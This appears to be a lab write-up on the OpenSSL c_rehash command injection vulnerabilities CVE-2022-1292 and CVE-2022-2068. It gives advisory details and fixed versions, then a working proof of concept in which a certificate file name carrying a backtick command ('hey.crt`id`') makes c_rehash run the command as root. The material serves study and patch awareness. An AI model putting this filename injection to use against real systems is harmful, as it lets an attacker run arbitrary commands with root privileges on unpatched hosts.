# What is OpenSSL?
The OpenSSL software is a robust, commercial-grade, full-featured toolkit for general-purpose cryptography and secure communication. It is licensed under an Apache-style license. Reference: https://www.openssl.org/


# What is CVE-2022-1292?
The c_rehash script does not properly sanitize shell metacharacters to prevent command injection. This script is distributed by some operating systems in a manner where it is automatically executed. On such operating systems, an attacker could execute arbitrary commands with the privileges of the script. Use of the c_rehash script is considered obsolete and should be replaced by the OpenSSL rehash command line tool. It was reported by Elison Niven (Sophos). 
Reference: https://www.cve.org/CVERecord?id=CVE-2022-1292 and URL: https://www.openssl.org/news/vulnerabilities.html

# CVE-2022-2068:
In addition to the c_rehash shell command injection identified in CVE-2022-1292, further circumstances where the c_rehash script does not properly sanitize shell metacharacters to prevent command injection were found by code review. When the CVE-2022-1292 was fixed it was not discovered that there are other places in the script where the file names of certificates being hashed were possibly passed to a command executed through the shell. This script is distributed by some operating systems in a manner where it is automatically executed. On such operating systems, an attacker could execute arbitrary commands with the privileges of the script. Use of the c_rehash script is considered obsolete and should be replaced by the OpenSSL rehash command line tool. Reported by Chancen (Qingteng 73lab).
Fixed in OpenSSL 3.0.4 (Affected 3.0.0,3.0.1,3.0.2,3.0.3)
Fixed in OpenSSL 1.1.1p (Affected 1.1.1-1.1.1o)
Fixed in OpenSSL 1.0.2zf (Affected 1.0.2-1.0.2ze)


# PoC CVE-2022-1292 
#https://github.com/alcaparra/CVE-2022-1292

```
Command injection ocurrs because filenames are not properly sanitized:

$fname =~ s/'/'\\''/g;
my ($hash, $fprint) = `"$openssl" crl $crlhash -fingerprint -noout -in '$fname'`;
This part of the script is vulnerable, as closing the backticks allows for command execution, for example a file named: MyCert.crt`whoami` will run "whoami".
```

# Commands

```
root@INE:/etc/ssl/certs# openssl version
OpenSSL 1.1.1f  31 Mar 2020

root@INE:/etc/ssl/certs# ls -rtl /usr/local/bin/c_rehash
-rwxr-xr-x 1 root root 6176 Sep 21  2022 /usr/local/bin/c_rehash
root@INE:/etc/ssl/certs# 

#
cd /etc/ssl/certs/
echo "-----BEGIN CERTIFICATE-----" > "hey.crt\`id\`"

root@INE:/etc/ssl/certs# ls -al hey.crt\`id\`
-rw-r--r-- 1 root root 28 Dec 28 21:44 'hey.crt`id`'
root@INE:/etc/ssl/certs# c_rehash .
Doing .
WARNING: Skipping duplicate certificate ca-certificates.crt
Can't open hey.crtuid=0(root) gid=0(root) groups=0(root) for reading, No such file or directory
140121747203392:error:02001002:system library:fopen:No such file or directory:crypto/bio/bss_file.c:69:fopen('hey.crtuid=0(root) gid=0(root) groups=0(root)','r')
140121747203392:error:2006D080:BIO routines:BIO_new_file:no such file:crypto/bio/bss_file.c:76:
unable to load certificate
```


Objective: Leverage the improper sanitization of the shell metacharacters to exploit the command injection vulnerability.

```
root@INE:/etc/ssl/certs# grep crlhash /usr/local/bin/c_rehash
my $crlhash = "-hash";
            $crlhash = "-hash_old";
                my ($hash, $fprint) = `"$openssl" crl $crlhash -fingerprint -noout -in '$fname'`;
root@INE:/etc/ssl/certs# 
```

https://www.cvedetails.com/cve/CVE-2022-1292/
https://www.debian.org/security/2022/dsa-5139
https://lists.debian.org/debian-lts-announce/2022/05/msg00019.html
https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=1ad73b4d27bd8c1b369a3cd453681d3a4f1bb9b2
https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=e5fd1728ef4c7a5bf7c7a7163ca60370460a6e23
https://www.openssl.org/news/secadv/20220503.txt